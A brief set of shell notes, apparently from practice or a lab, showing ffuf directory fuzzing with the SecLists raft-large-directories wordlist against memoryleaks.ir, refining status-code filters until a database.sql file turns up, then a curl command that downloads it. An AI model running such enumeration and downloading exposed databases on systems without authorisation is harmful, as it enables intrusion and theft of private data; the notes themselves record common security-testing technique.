https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/raft-large-directories.txt?utm_source=chatgpt.com
```shell
ffuf -w raft-large-directories.txt -u https://memoryleaks.ir/FUZZ 

ffuf -w raft-large-directories.txt -u https://memoryleaks.ir/FUZZ -fc 301

ffuf -w raft-large-directories.txt -u https://memoryleaks.ir/FUZZ -mc all -fc 301,404 -c

ffuf -w raft-large-directories.txt -u https://memoryleaks.ir/FUZZ.php -mc all -fc 301,404 -c

ffuf -w raft-large-directories.txt:mobina -u https://memoryleaks.ir/FUZZ.sql -mc all -fc 301,404,403 -c  --->database.sql

curl -s https://memoryleaks.ir/database.sql
```
